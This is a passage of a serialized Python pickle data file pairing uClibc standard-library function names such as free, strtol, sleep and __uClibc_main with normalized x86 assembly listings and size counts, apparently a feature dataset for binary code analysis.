I+0],EAX\nOR~[EDI+EBX+0],0\nJMP~FOO\nMOV~EDX,[ESP+0]\nLEA~EAX,[EDI+EDX]\nMOV~EDX,[EDI+0]\nAND~EDX,0\nOR~EDX,[ESP+0]\nSUB~ESP,0\nMOV~[EDI+0],EDX\nMOV~EDX,ECX\nOR~EDX,0\nMOV~[EAX+0],EDX\nOR~[EAX+ECX+0],0\nADD~EAX,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nLEA~EBX,[EDI+0]\nJMP~FOO\nMOV~ECX,[ESP+0]\nMOV~EAX,<STR>\nDEC~EAX\nMOV~ESI,[ESP+0]\nMOV~EBP,[ECX-0]\nADD~ESI,0\nMOV~[ESP],ESI\nLEA~EDX,[EAX+EBP]\nNOT~EAX\nLEA~ESI,[EDX+ESI]\nAND~ESI,EAX\nMOV~EBX,ESI\nSUB~EBX,EBP\nCMP~[ESP+0],EBX\nJZ~FOO\nPUSH~0\nPUSH~ESI\nMOV~EAX,[ESP+0]\nSUB~EDI,EBP\nADD~EAX,EBP\nPUSH~EAX\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nLEA~EDX,[EAX+EBP]\nOR~EBX,0\nMOV~EAX,ESI\nMOV~[EDX+0],EBX\nSUB~EAX,[ESP+0]\nADD~EAX,<STR>\nMOV~<STR>,EAX\nCMP~EAX,<STR>\nJBE~FOO\nMOV~<STR>,EAX\nADD~EAX,<STR>\nCMP~EAX,<STR>\nJBE~FOO\nMOV~<STR>,EAX\nLEA~EBX,[EDX+0]\nJMP~FOO\nMOV~EAX,[ESP]\nCMP~[ESP+0],EAX\nJNB~FOO\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nSUB~EAX,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nTEST~EAX,EAX\nJZ~FOO\nPUSH~ECX\nMOV~EAX,[ESP+0]\nSUB~EAX,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~EBX\nCALL~FOO\nPOP~EDX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nXOR~EBX,EBX\nJMP~FOO\nMOV~EBX,[ESP+0]\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nMOV~EAX,EBX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p350
L808L
tp351
a(S'__malloc_trim'
p352
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBP,EDX\nMOV~ECX,[EDX+0]\nMOV~EDX,[EDX+0]\nMOV~ESI,[EDX+0]\nAND~ESI,0\nMOV~EDX,ESI\nSUB~EDX,EAX\nLEA~EAX,[EDX+ECX-0]\nXOR~EDX,EDX\nDIV~,ECX\nLEA~EBX,[EAX-0]\nIMUL~EBX,ECX\nTEST~EBX,EBX\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~EDI,EAX\nMOV~EAX,ESI\nADD~EAX,[EBP+0]\nADD~ESP,0\nCMP~EDI,EAX\nJNZ~FOO\nSUB~ESP,0\nNEG~EBX\nPUSH~EBX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~ECX,EDI\nSUB~ECX,EAX\nJZ~FOO\nMOV~EAX,[EBP+0]\nSUB~[EBP+0],ECX\nSUB~ESI,ECX\nOR~ESI,0\nMOV~[EAX+0],ESI\nMOV~EAX,0\nJMP~FOO\nXOR~EAX,EAX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p353
L141L
tp354
a(S'__malloc_consolidate'
p355
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~EAX,[EDX]\nMOV~EDX,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~ECX,[ESP+0]\nAND~EAX,0\nMOV~[ECX],EAX\nADD~ECX,0\nMOV~EAX,[ESP+0]\nMOV~EDX,[ESP+0]\nADD~EAX,0\nMOV~[ESP+0],ECX\nMOV~[ESP+0],EAX\nMOV~EAX,[EDX]\nMOV~ECX,[ESP+0]\nSHR~EAX,0\nLEA~EAX,[ECX+EAX*4-0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~ECX,[EAX]\nTEST~ECX,ECX\nJZ~FOO\nMOV~DWORDPTR[EAX],0\nMOV~EDX,[ECX+0]\nMOV~[ESP+0],EDX\nMOV~EAX,[ECX+0]\nMOV~EDI,EAX\nAND~EDI,0\nTEST~AL,0\nLEA~EBX,[ECX+EDI]\nMOV~EDX,[EBX+0]\nMOV~[ESP+0],EDX\nJNZ~FOO\nMOV~EBP,[ECX]\nMOV~EAX,ECX\nSUB~EAX,EBP\nMOV~ESI,[EAX+0]\nMOV~EDX,[EAX+0]\nMOV~ECX,[ESI+0]\nCMP~ECX,EAX\nJNZ~FOO\nCMP~[EDX+0],ECX\nJNZ~FOO\nADD~EDI,EBP\nMOV~[ESI+0],EDX\nMOV~[EDX+0],ESI\nMOV~EAX,[ESP+0]\nMOV~EBP,[ESP+0]\nAND~EBP,0\nCMP~EBX,[EAX+0]\nJZ~FOO\nMOV~EAX,[EBX+EBP+0]\nMOV~[EBX+0],EBP\nAND~EAX,0\nTEST~EAX,EAX\nJNZ~FOO\nMOV~EDX,[EBX+0]\nMOV~EAX,[EBX+0]\nMOV~ESI,[EDX+0]\nCMP~ESI,EBX\nJNZ~FOO\nCMP~[EAX+0],ESI\nJZ~FOO\nCALL~FOO\nADD~EDI,EBP\nMOV~[EDX+0],EAX\nMOV~[EAX+0],EDX\nMOV~EAX,[ESP+0]\nMOV~EDX,[EAX+0]\nMOV~[EAX+0],ECX\nMOV~EAX,EDI\nOR~EAX,0\nMOV~[EDX+0],ECX\nMOV~[ECX+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ECX+0],EDX\nMOV~[ECX+0],EAX\nMOV~[ECX+EDI],EDI\nJMP~FOO\nLEA~EAX,[EDI+EBP]\nOR~EAX,0\nMOV~[ECX+0],EAX\nMOV~EDX,[ESP+0]\nMOV~[EDX+0],ECX\nMOV~ECX,[ESP+0]\nTEST~ECX,ECX\nJNZ~FOO\nMOV~ECX,[ESP+0]\nCMP~[ESP+0],ECX\nJZ~FOO\nADD~[ESP+0],0\nJMP~FOO\nMOV~ECX,[ESP+0]\nLEA~EAX,[ECX+EDX*8+0]\nINC~EDX\nMOV~[EAX+0],EAX\nMOV~[EAX+0],EAX\nCMP~EDX,0\nJLE~FOO\nMOV~EAX,[ESP+0]\nOR~[EAX+0],0\nMOV~[EAX+0],0\nMOV~[EAX+0],0\nMOV~[EAX+0],0\nMOV~[EAX+0],0\nMOV~EDX,[ESP+0]\nSUB~ESP,0\nMOV~EAX,[EDX]\nAND~EAX,0\nOR~EAX,0\nMOV~[EDX],EAX\nMOV~EAX,EDX\nADD~EAX,0\nMOV~[EDX+0],EAX\nPUSH~0\nCALL~FOO\nMOV~ECX,[ESP+0]\nADD~ESP,0\nMOV~[ECX+0],EAX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p356
L424L
tp357
a(S'free'
p358
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nTEST~EDI,EDI\nJZ~FOO\nPUSH~ESI\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nLEA~ECX,[EDI-0]\nMOV~EAX,<STR>\nADD~ESP,0\nMOV~EDX,[ECX+0]\nMOV~EBX,EDX\nAND~EBX,0\nCMP~EBX,EAX\nJA~FOO\nSHR~EBX,0\nOR~EAX,0\nMOV~<STR>,EAX\nLEA~EDX,<STR>\nMOV~EAX,[EDX-0]\nMOV~[ECX+0],EAX\nMOV~[EDX-0],ECX\nJMP~FOO\nAND~DL,0\nJNZ~FOO\nOR~EAX,0\nLEA~ESI,[ECX+EBX]\nMOV~<STR>,EAX\nMOV~EAX,[ESI+0]\nMOV~[ESP+0],EAX\nTEST~[ECX+0],0\nJNZ~FOO\nMOV~EBP,[EDI-0]\nMOV~EAX,ECX\nSUB~EAX,EBP\nMOV~EDI,[EAX+0]\nMOV~EDX,[EAX+0]\nMOV~ECX,[EDI+0]\nCMP~ECX,EAX\nJNZ~FOO\nCMP~[EDX+0],ECX\nJNZ~FOO\nADD~EBX,EBP\nMOV~[EDI+0],EDX\nMOV~[EDX+0],EDI\nMOV~EBP,[ESP+0]\nAND~EBP,0\nCMP~ESI,<STR>\nJZ~FOO\nMOV~EAX,[ESI+EBP+0]\nMOV~[ESI+0],EBP\nAND~EAX,0\nTEST~EAX,EAX\nJNZ~FOO\nMOV~EDX,[ESI+0]\nMOV~EAX,[ESI+0]\nMOV~EDI,[EDX+0]\nCMP~EDI,ESI\nJNZ~FOO\nCMP~[EAX+0],EDI\nJZ~FOO\nCALL~FOO\nMOV~[EDX+0],EAX\nMOV~[EAX+0],EDX\nADD~EBX,EBP\nMOV~EAX,<STR>\nMOV~[ECX+0],0\nMOV~[ECX+0],EAX\nMOV~[ECX+EBX],EBX\nMOV~[EAX+0],ECX\nMOV~EAX,EBX\nOR~EAX,0\nMOV~<STR>,ECX\nMOV~[ECX+0],EAX\nJMP~FOO\nADD~EBX,EBP\nMOV~EAX,EBX\nOR~EAX,0\nMOV~[ECX+0],EAX\nMOV~<STR>,ECX\nCMP~EBX,0\nJBE~FOO\nTEST~<STR>,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EAX,<STR>\nMOV~EAX,[EAX+0]\nAND~EAX,0\nCMP~EAX,<STR>\nJB~FOO\nMOV~EDX,0\nMOV~EAX,<STR>\nCALL~FOO\nJMP~FOO\nMOV~EDX,[EDI-0]\nDEC~<STR>\nLEA~EAX,[EBX+EDX]\nSUB~ECX,EDX\nPUSH~EBX\nPUSH~EBX\nPUSH~EAX\nPUSH~ECX\nSUB~<STR>,EAX\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p359
L412L
tp360
a(S'abort'
p361
S'"PUSH~EBX\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~EAX,0\nADD~ESP,0\nJMP~FOO\nMOV~[ESP+EAX*4+0],0\nDEC~EAX\nJNS~FOO\nPUSH~EBX\nPUSH~EBX\nPUSH~0\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNZ~FOO\nPUSH~ECX\nPUSH~0\nPUSH~EBX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nCMP~<STR>,0\nJNZ~FOO\nMOV~<STR>,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nMOV~AL,<STR>\nCMP~AL,0\nJNZ~FOO\nPUSH~EDX\nPUSH~0\nPUSH~0\nMOV~<STR>,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],0\nMOV~EAX,0\nADD~ESP,0\nJMP~FOO\nMOV~[ESP+EAX*4+0],0\nDEC~EAX\nJNS~FOO\nMOV~[ESP+0],0\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nMOV~<STR>,0\nHLT\nCMP~<STR>,0\nJNZ~FOO\nSUB~ESP,0\nMOV~<STR>,0\nPUSH~0\nCALL~FOO\nHLT"'
p362
L271L
tp363
a(S'atol'
p364
S'"SUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nRETN"'
p365
L20L
tp366
a(S'strtol'
p367
S'"SUB~ESP,0\nPUSH~0\nPUSH~[ESP+0]\nPUSH~[ESP+0]\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nRETN"'
p368
L26L
tp369
a(S'_stdlib_strto_l'
p370
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDX,<STR>\nMOV~ECX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~EBX,ECX\nJMP~FOO\nINC~EBX\nMOVSX~EAX,BYTEPTR[EBX]\nTEST~BYTEPTR[EDX+EAX*2],0\nJNZ~FOO\nCMP~EAX,0\nJZ~FOO\nXOR~EBP,EBP\nCMP~EAX,0\nJNZ~FOO\nMOV~EBP,0\nJMP~FOO\nXOR~EBP,EBP\nINC~EBX\nMOV~EDI,ECX\nTEST~ESI,0\nJNZ~FOO\nADD~ESI,0\nCMP~BYTEPTR[EBX],0\nJNZ~FOO\nINC~EBX\nSUB~ESI,0\nMOV~EDI,EBX\nMOV~AL,[EBX]\nOR~EAX,0\nCMP~AL,0\nJNZ~FOO\nADD~ESI,ESI\nINC~EBX\nCMP~ESI,0\nJLE~FOO\nMOV~ESI,0\nLEA~EAX,[ESI-0]\nXOR~EDX,EDX\nCMP~EAX,0\nJA~FOO\nOR~EAX,0\nXOR~EDX,EDX\nDIV~,ESI\nMOV~[ESP+0],DL\nXOR~EDX,EDX\nMOV~[ESP+0],EAX\nJMP~FOO\nMOV~EDI,EBX\nMOV~AL,[EBX]\nLEA~ECX,[EAX-0]\nCMP~CL,0\nJBE~FOO\nOR~EAX,0\nMOV~CL,0\nCMP~AL,0\nJBE~FOO\nLEA~ECX,[EAX-0]\nMOVZX~EAX,CL\nCMP~EAX,ESI\nJGE~FOO\nINC~EBX\nCMP~EDX,[ESP+0]\nJA~FOO\nJNZ~FOO\nCMP~CL,[ESP+0]\nJBE~FOO\nMOV~AL,[ESP+0]\nAND~EBP,EAX\nCALL~FOO\nOR~EDX,0\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nIMUL~EDX,ESI\nMOVZX~EAX,CL\nADD~EDX,EAX\nJMP~FOO\nCMP~[ESP+0],0\nJZ~FOO\nMOV~EAX,[ESP+0]\nMOV~[EAX],EDI\nMOV~EAX,EBP\nCMP~AL,0\nSBB~EBX,EBX\nSUB~EBX,0\nCMP~[ESP+0],0\nJZ~FOO\nCMP~EDX,EBX\nJBE~FOO\nCALL~FOO\nMOV~EDX,EBX\nMOV~DWORDPTR[EAX],0\nMOV~EAX,EBP\nTEST~AL,AL\nJZ~FOO\nNEG~EDX\nADD~ESP,0\nMOV~EAX,EDX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p371
L277L
tp372
a(S'exit'
p373
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nPUSH~0\nPUSH~0\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~EAX,<STR>\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~EAX\nADD~ESP,0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~EBX\nCALL~FOO\nCALL~FOO\nMOV~EAX,0\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nCALL~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO"'
p374
L103L
tp375
a(S'sleep'
p376
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nMOV~EDX,[ESP+0]\nTEST~EDX,EDX\nJNZ~FOO\nJMP~FOO\nMOV~[ESP+EAX*4+0],0\nDEC~EAX\nJNS~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],EDX\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJS~FOO\nPUSH~EAX\nLEA~ESI,[ESP+0]\nPUSH~ESI\nPUSH~EBX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDX,0\nTEST~EAX,EAX\nJZ~FOO\nJMP~FOO\nMOV~[ESP+EDX*4+0],0\nDEC~EDX\nJNS~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJS~FOO\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNS~FOO\nCALL~FOO\nMOV~EBX,EAX\nMOV~ESI,[EAX]\nPUSH~EBP\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nOR~EAX,0\nADD~ESP,0\nMOV~[EBX],ESI\nJMP~FOO\nCMP~[ESP+0],0\nLEA~EBP,[ESP+0]\nLEA~EBX,[ESP+0]\nJNZ~FOO\nPUSH~EDI\nPUSH~EDI\nPUSH~EBX\nPUSH~EBX\nCALL~FOO\nMOV~EDI,EAX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nMOV~ESI,[EAX]\nPUSH~0\nPUSH~EBP\nPUSH~0\nCALL~FOO\nMOV~[EBX],ESI\nJMP~FOO\nPUSH~ESI\nPUSH~0\nPUSH~EBP\nPUSH~0\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EBX\nPUSH~EBX\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~EAX\nCALL~FOO\nMOV~EDI,EAX\nADD~ESP,0\nTEST~EDI,EDI\nJZ~FOO\nXOR~EAX,EAX\nCMP~[ESP+0],0\nSETNLE~AL\nADD~EAX,[ESP+0]\nJMP~FOO\nXOR~EAX,EAX\nJMP~FOO\nOR~EAX,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p377
L393L
tp378
a(S'sysconf'
p379
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nCMP~EAX,0\nJA~FOO\nJMP~<STR>\nMOV~EAX,0\nJMP~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNS~FOO\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nOR~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nADD~ESP,0\nRETN"'
p380
L325L
tp381
a(S'__uClibc_fini'
p382
S'"PUSH~EBX\nMOV~EBX,0\nSUB~EBX,0\nSUB~ESP,0\nSAR~EBX,0\nJMP~FOO\nCALL~<STR>\nDEC~EBX\nCMP~EBX,0\nJNZ~FOO\nMOV~EAX,<STR>\nTEST~EAX,EAX\nJZ~FOO\nCALL~EAX\nMOV~ECX,<STR>\nTEST~ECX,ECX\nJZ~FOO\nPOP~EBX\nPOP~EAX\nPOP~EBX\nJMP~ECX\nPOP~EAX\nPOP~EDX\nPOP~EBX\nRETN"'
p383
L63L
tp384
a(S'__check_one_fd'
p385
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,EAX\nMOV~EBX,EDX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJNZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~EBX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nCMP~EAX,ESI\nJZ~FOO\nCALL~FOO\nPOP~EAX\nPOP~EBX\nPOP~ESI\nRETN"'
p386
L52L
tp387
a(S'__uClibc_init'
p388
S'"SUB~ESP,0\nCMP~<STR>,0\nJNZ~FOO\nMOV~EAX,0\nMOV~<STR>,0\nMOV~<STR>,0\nTEST~EAX,EAX\nJZ~FOO\nCALL~FOO\nMOV~EAX,0\nTEST~EAX,EAX\nJZ~FOO\nADD~ESP,0\nJMP~FOO\nADD~ESP,0\nRETN"'
p389
L64L
tp390
a(S'__uClibc_main'
p391
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~<STR>,EAX\nMOV~EAX,[ESP+0]\nMOV~<STR>,EAX\nMOV~EAX,[ESP+0]\nMOV~EBP,[ESP+0]\nLEA~EDX,[EDI+EAX*4]\nLEA~EAX,[EDX+0]\nMOV~<STR>,EAX\nCMP~EAX,[EDI]\nJNZ~FOO\nMOV~<STR>,EDX\nPUSH~ECX\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,<STR>\nADD~ESP,0\nCMP~DWORDPTR[EAX],0\nLEA~EAX,[EAX+0]\nJNZ~FOO\nMOV~EBX,EAX\nJMP~FOO\nMOV~EAX,[EBX]\nCMP~EAX,0\nJA~FOO\nPUSH~EDX\nPUSH~0\nPUSH~EBX\nLEA~EAX,[ESP+EAX*8+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~EBX,0\nCMP~DWORDPTR[EBX],0\nJNZ~FOO\nLEA~EAX,[ESP+0]\nCALL~FOO\nCALL~FOO\nMOV~EAX,[ESP+0]\nTEST~EAX,EAX\nJNZ~FOO\nMOV~AX,0\nMOV~<STR>,EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~EBX,EAX\nCALL~FOO\nCMP~EBX,EAX\nJNZ~FOO\nCALL~FOO\nMOV~EBX,EAX\nCALL~FOO\nCMP~EBX,EAX\nJNZ~FOO\nMOV~EAX,[ESP+0]\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,[ESP+0]\nJNZ~FOO\nMOV~EAX,[ESP+0]\nCMP~EAX,[ESP+0]\nJZ~FOO\nMOV~EDX,0\nXOR~EAX,EAX\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ESI,0\nMOV~EAX,[EDI]\nSUB~ESI,0\nMOV~<STR>,EAX\nSAR~ESI,0\nMOV~EAX,[ESP+0]\nXOR~EBX,EBX\nMOV~<STR>,EAX\nJMP~FOO\nCALL~<STR>\nINC~EBX\nCMP~EBX,ESI\nJB~FOO\nTEST~EBP,EBP\nJZ~FOO\nCALL~EBP\nMOV~ESI,0\nXOR~EBX,EBX\nSUB~ESI,0\nSAR~ESI,0\nJMP~FOO\nCALL~<STR>\nINC~EBX\nCMP~EBX,ESI\nJB~FOO\nMOV~EAX,0\nTEST~EAX,EAX\nJZ~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nMOV~EAX,0\nTEST~EAX,EAX\nJZ~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nPUSH~EAX\nPUSH~<STR>\nPUSH~EDI\nPUSH~[ESP+0]\nCALL~[ESP+0]\nMOV~[ESP],EAX\nCALL~FOO"'
p392
L441L
tp393
a(S'sigaction'
p394
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nMOV~ESI,[ESP+0]\nTEST~EBX,EBX\nJZ~FOO\nMOV~EAX,[EBX]\nMOV~[ESP+0],EAX\nLEA~EAX,[EBX+0]\nPUSH~EDX\nPUSH~0\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,[EBX+0]\nOR~EAX,0\nMOV~[ESP+0],EAX\nADD~ESP,0\nMOV~EAX,0\nTEST~[EBX+0],0\nJNZ~FOO\nMOV~EAX,0\nMOV~[ESP+0],EAX\nXOR~EDX,EDX\nTEST~ESI,ESI\nJZ~FOO\nLEA~EDX,[ESP+0]\nXOR~EAX,EAX\nTEST~EBX,EBX\nJZ~FOO\nLEA~EAX,[ESP+0]\nPUSH~0\nPUSH~EDX\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nTEST~ESI,ESI\nJZ~FOO\nTEST~EAX,EAX\nJS~FOO\nMOV~EAX,[ESP+0]\nMOV~[ESI],EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,[ESP+0]\nMOV~[ESI+0],EAX\nMOV~EAX,[ESP+0]\nADD~ESP,0\nMOV~[ESI+0],EAX\nMOV~EAX,EBX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nRETN"'
p395
L217L
tp396
a(S'mmap'
p397
S'"MOV~EDX,EBX\nMOV~EAX,0\nLEA~EBX,[ESP+0]\nINT~0\nMOV~EBX,EDX\nCMP~EAX,0\nJA~FOO\nRETN"'
p398
L27L
tp399
a(S'__socketcall'
p400
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p401
L50L
tp402
a(S'__syscall_rt_sigaction'
p403
S'"PUSH~EDI\nPUSH~ESI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~ESI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~ESI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~ESI\nMOV~[EAX],ESI\nOR~ESI,0\nMOV~EAX,ESI\nPOP~EDX\nPOP~ESI\nPOP~EDI\nRETN"'
p404
L59L
tp405
a(S'_exit'
p406
S'"PUSH~EDI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0"'
p407
L19L
tp408
a(S'clock_getres'
p409
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p410
L50L
tp411
a(S'fstat'
p412
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nLEA~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nJMP~FOO\nTEST~EAX,EAX\nJNZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nMOV~EAX,EBX\nADD~ESP,0\nPOP~EBX\nRETN"'
p413
L72L
tp414
a(S'__getdents'
p415
